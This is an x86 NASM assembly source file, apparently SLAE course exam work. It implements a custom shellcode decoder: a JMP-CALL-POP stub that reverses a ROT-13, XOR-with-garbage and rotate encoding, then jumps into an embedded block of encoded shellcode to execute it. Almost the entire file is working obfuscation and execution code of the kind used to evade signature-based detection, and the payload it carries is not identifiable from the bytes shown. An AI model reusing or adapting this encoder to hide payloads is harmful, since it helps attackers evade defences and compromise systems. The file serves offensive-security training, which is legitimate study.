; Filename: 	decoder.nasm
; Author:  	Jakub Heba
; Purpose:	SLAE Course & Exam


global _start
section .text write
_start:
        jmp short call_shellcode	; JMP-CALL-POP

decoder:
        pop esi				; Popping the shellcode variable content into ESI
        xor eax, eax			; clearing EAX
	mul ecx				; clearing ECX and EDX
        xor ebx, ebx			; clearing EBX
        mov bl, 0xaa			; our "STOP DECODING" tag

decode:
        mov al, byte [esi+edx]		; Moving byte from encoded shellcode into EAX. Becouse of incrementing of EDX, it will always be the encoded byte from original shellcode
	rol al, 2			; Left shift 2 (Inversely than in the encoder)
	xor al, byte [esi+edx+1]	; XOR-ing the selected byte with next one (garbage)
	sub al, 13			; Inversion of ROT-13 operation
	add dl, 2			; Incrementing the EDX by 2 (to jump over garbage)
	mov byte [esi+ecx],al		; Moving the decoded byte into correct space in ESI (shellcode)
	inc cl				; incrementing a counter that indicates next place for the decoded byte

        cmp bl, byte [esi+edx]		; Checking, that next byte contains \xaa (start of the "STOP DECODING" tag
        jnz decode			; If ZF is not set (values are different), JMP to the loop for next byte

        cmp bl, byte [esi+edx+1]	; Checking if the value of the second byte ahead is also \xaa, which will mean the occurrence of the tag and the end of decoding
        jnz decode			; If no (ZF not set) that means, that it was normal occurance of \xaa in the shellcode, so let's JMP to the loop for the next byte

        jmp short shellcode		; If yes (ZF set again) JMP to the shellcode and execute 

call_shellcode:
        call decoder
	shellcode: db 0x80,0x3c,0xbb,0x23,0x3b,0xd2,0x1e,0x90,0x28,0x9e,0x70,0x17,0x1f,0x42,0x0d,0xeb,0x34,0x6d,0x0a,0x5b,0x2b,0x6c,0xec,0xbd,0xab,0x90,0xd8,0x60,0x88,0x41,0xb2,0xbd,0xea,0xa5,0xd2,0x3c,0xff,0xf0,0x62,0x1f,0x80,0xec,0x44,0xcb,0x14,0xdd,0x81,0x90,0xff,0x30,0x08,0x9d,0x95,0x25,0xd2,0x8b,0xc8,0x33,0x73,0xae,0x8e,0xfc,0xaa,0x3b,0xbd,0xe4,0x26,0x8a,0x66,0x8a,0xf6,0x55,0x53,0xbb,0x44,0x03,0xd9,0x75,0x11,0x56,0x3a,0xfa,0x09,0x7a,0xef,0xcc,0x5e,0x0c,0x02,0x16,0xf9,0x8e,0xc9,0x54,0x21,0xf3,0xb4,0xdd,0x46,0x8f,0xe8,0x4d,0xd9,0x10,0x90,0x5f,0xbe,0xa4,0x6b,0xf2,0x3f,0x6a,0x97,0xb0,0x80,0xd8,0x34,0x5d,0xe6,0x26,0x50,0x0d,0x5f,0xeb,0xe6,0x7b,0xdd,0x49,0x53,0x9b,0x96,0x80,0x99,0xeb,0xf7,0x62,0x05,0x58,0xb0,0x7c,0x3d,0xfa,0x4f,0xe7,0x28,0x2d,0x1b,0xd1,0x1a,0x24,0xd7,0xe1,0x53,0x42,0xbc,0x28,0xcc,0xbe,0xe2,0x36,0x3d,0xec,0x56,0x67,0x9b,0x6d,0x1d,0x17,0xe5,0xe2,0xa2,0xf1,0x1c,0x4c,0x9e,0xfa,0x96,0x2f,0x97,0x2b,0x9c,0x4e,0x2d,0x88,0x63,0xe2,0xaf,0xc8,0xc3,0x99,0x9b,0x9e,0x1a,0x56,0x76,0x0f,0x79,0xdb,0x01,0xdb,0x70,0x1b,0x33,0x41,0xaa,0xaa
